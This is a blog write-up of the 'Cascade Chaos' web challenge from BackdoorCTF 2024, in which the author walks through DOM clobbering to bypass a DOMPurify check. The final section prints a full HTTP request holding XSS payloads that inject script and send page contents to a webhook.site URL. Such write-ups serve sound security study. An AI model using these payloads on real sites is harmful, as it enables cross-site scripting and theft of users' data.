---
title: "Cascade Chaos"
description: "A Markdown app that looks harmless... or is it? Can you find the subtle cracks in the system and make things a bit more... interesting? A little creativity goes a long way."
pubDate: 2024-12-23
ctf: "BackdoorCTF 2024"
category: "web"
author: "sealldev"
section: "CTFs"
image: "images/24-backdoor/icon.png"
---



Looking at the setup I presume its some dompurify exploit due to old version (`3.0.1` compared to latest `3.2.3` as of writing)
```html
...
  </style>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.0.1/purify.min.js"></script>
</head>
```

The markdown app seems to have dompurified input in the heading and then markdown payload:
```html
<body>
  <div class="heading">
  </div>

  <script>
    const heading = decodeURIComponent(`<%- heading -%>`);
    const headingDiv = document.querySelector(".heading");
    const content = DOMPurify.sanitize(heading);
    headingDiv.innerHTML = content;
  </script>
  <div class="content">
  </div>
  <button class="btn" id="showToAdminBtn">Show to Admin</button>

  <script>
    const body = decodeURIComponent(`<%- body -%>`);
    const contentDiv = document.querySelector(".content");
    if (window.isSafe) {
      contentDiv.innerHTML = body;
    } else {
      const sanitizedContent = DOMPurify.sanitize(body);
      contentDiv.innerHTML = sanitizedContent;
    }

    document.getElementById("showToAdminBtn").addEventListener("click", async () => {
      const contentDiv = document.querySelector(".content");
      const content = contentDiv.innerHTML.trim();
      const heading = document.querySelector(".heading").innerHTML.trim();

      const data = {
        content: content,
        heading: heading
      };
      let response = await fetch("/visit", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(data)
      });
      const result = await response.text();
      alert(result);
    });

  </script>
</body>
```

The Markdown payload is not sanitised if `window.isSafe` is set, so perhaps a prototype pollution in the heading, then normal XSS in Markdown?

The repo has an issue [Tampering by prototype pollution (high)](https://github.com/cure53/DOMPurify/security/advisories/GHSA-mmhx-hmjr-r674) A.K.A. `CVE-2024-45801` that is valid in <3.1.3 

Likely have to [commit diff for the 3.x patch](https://github.com/cure53/DOMPurify/commit/1e520262bf4c66b5efda49e2316d6d1246ca7b21)

## Post-CTF Solve

Turns out I'm completely wrong, thanks to my friend ([warlocksmurf](https://warlocksmurf.github.io/) my beloved) sharing their teams' path.

DOM clobbering (which I'd never heard of previously was the idea)

allows XSS on the remote service

```html
<a id="isSafe">
```
for the header

XSS in local service, colour parameter had injection point

```
POST /visit HTTP/1.1
Host: 35.224.222.30:4001
Content-Length: 323
Accept-Language: en-GB,en;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://35.224.222.30:4001
Referer: http://35.224.222.30:4001/convert?heading=%3Ca+id%3DisSafe%3E&content=%3Cimg%20src%3D%22x%22%20onerror%3D%22fetch(%27http%3A%2F%2Fhttpforever.com%27,%20%7B%20mode%3A%20%27no-cors%27%20%7D)%20.then(response%20%3D%3E%20response.text())%20.then(data%20%3D%3E%20location.href%20%3D%20%27https%3A%2F%2Fwebhook.site%2F0456830e-cbc2-4057-b98c-fe389f00f79c%2F%3Fc%3D%27%20%2B%20encodeURIComponent(data))%3B%22%3E
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

{
  "content": "<p><img src=\"x\" onerror=\"location.href='http://local:4002/flag?color=black</style><script>window.onload=function(){location.href=%27https://webhook.site/0456830e-cbc2-4057-b98c-fe389f00f79c/?c=%27%2bbtoa(document.documentElement.outerHTML)}</script>'\" ></p>",
  "heading": "<a id=\"isSafe\"></a>"
}
```